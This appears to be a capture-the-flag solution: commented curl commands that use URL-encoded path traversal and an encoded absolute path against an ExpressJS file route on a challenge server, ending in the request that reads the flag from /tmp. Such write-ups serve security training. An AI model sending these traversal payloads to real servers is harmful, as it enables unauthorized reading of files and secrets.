# Fail - Do not match path on ExpressJS Framework
curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/../../flag.name

# Get the flag location
curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/..%2f..%2fflag.name

# Try (and fail) to get the flag using /files/images
curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fimaflagimaflag

# Try (and fail) an absolute path to get the flag using /files/images
curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/%2ftmp%2fimaflagimaflag

# Finally :)
curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/binary/%2ftmp%2fimaflagimaflag